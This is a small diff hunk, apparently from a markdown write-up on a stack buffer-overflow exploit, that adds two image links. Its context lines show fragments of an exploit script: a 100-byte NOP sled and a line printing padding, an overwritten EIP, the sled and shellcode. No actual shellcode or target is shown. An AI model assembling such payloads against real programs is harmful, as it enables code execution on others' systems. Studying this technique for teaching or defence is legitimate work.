@@ -66,9 +66,9 @@ NOP = "\x90" \* 100
 
 print pad + EIP + NOP + shellcode
 
+![](/png/10.png)
 
-
-
+![](/png/16.png)
 
 Ref：
 
